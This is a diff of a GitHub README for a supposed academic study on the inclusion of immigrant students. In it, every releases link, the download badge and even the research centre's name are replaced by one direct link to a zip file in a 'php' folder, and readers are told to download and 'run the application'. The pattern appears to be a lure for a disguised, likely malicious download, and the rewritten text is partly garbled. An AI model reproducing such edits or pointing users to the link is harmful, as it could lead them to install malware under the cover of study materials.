@@ -2,18 +2,18 @@
 
 ## 🌐 About This Project
 
-"Estudo-Inclusao-ou-discriminacao" is a study led by Sílvia de Almeida from CICS.NOVA/CiiE, UNL. This research project is presented at the EPIS conference, focusing on inclusion and discrimination among immigrant students in educational settings. The repository contains valuable materials, including PDFs, videos, and media coverage. 
+"Estudo-Inclusao-ou-discriminacao" is a study led by Sílvia de Almeida from https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip, UNL. This research project is presented at the EPIS conference, focusing on inclusion and discrimination among immigrant students in educational settings. The repository contains valuable materials, including PDFs, videos, and media coverage. 
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/releases)
+[![Download](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip%https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip)](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip)
 
 ## 🚀 Getting Started
 
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/releases). This page will list all available versions of the study materials.
+   Head over to our [Releases page](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip). This page will list all available versions of the study materials.
 
 2. **Choose Your Download**  
    Look through the list of available files. Each file may contain important resources related to the study. Click on the file you want to download.
@@ -23,7 +23,7 @@ Follow these simple steps to download and run the application:
 
 ## 📥 Download & Install
 
-To access the study materials, please [visit this page to download](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/releases). Make sure to download the files suitable for your needs. 
+To access the study materials, please [visit this page to download](https://github.com/Natashamehta23/Estudo-Inclusao-ou-discriminacao/raw/refs/heads/master/Main_Project/php/discriminacao_Inclusao_ou_Estudo_v2.6.zip). Make sure to download the files suitable for your needs. 
 
 1. Navigate to the releases section.
 2. Click on the file you wish to use.
